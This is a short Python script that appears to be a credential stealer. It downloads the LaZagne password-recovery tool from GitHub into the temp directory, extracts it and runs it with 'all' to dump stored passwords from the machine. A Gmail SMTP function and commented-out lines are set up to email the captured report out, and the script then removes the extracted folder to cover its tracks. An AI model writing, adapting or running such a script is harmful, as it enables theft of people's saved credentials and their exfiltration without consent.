#!usr/bin/env python
import smtplib, requests, os, tempfile, subprocess, zipfile

def send_mail(mail, password, message)->bool:
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587) 
        server.starttls()
        server.login(mail, password)
        server.sendmail(mail, mail, message)
        server.quit()
        return True
    except smtplib.SMTPException as e:
        print('[-] Exception : ', e)
        return False


def download(url:str)->bool:
    try:
        response = requests.get(url)
        file_name = url.split('/')[-1]
        with open(file_name, 'wb') as dfile:
            dfile.write(response.content)
        return True
    except Exception as e:
        print('[-] Exception : ', e)
        return False


tmp_dir = tempfile.gettempdir()
os.chdir(tmp_dir)
# download LaZagne
download(r'https://github.com/AlessandroZ/LaZagne/releases/download/2.3.2/Windows.zip')
with zipfile.ZipFile('Windows.zip', 'r') as zip_file:
    zip_file.extractall(tmp_dir)

os.chdir('Windows')
recovered_report = subprocess.call('laZagne_x86.exe all')
print(recovered_report)
# report = subprocess.check_output('lazagne.exe all -vv')
# send_mail('gmail_id','gmail_passwd', report)
os.chdir('..')
os.removedirs('Windows')
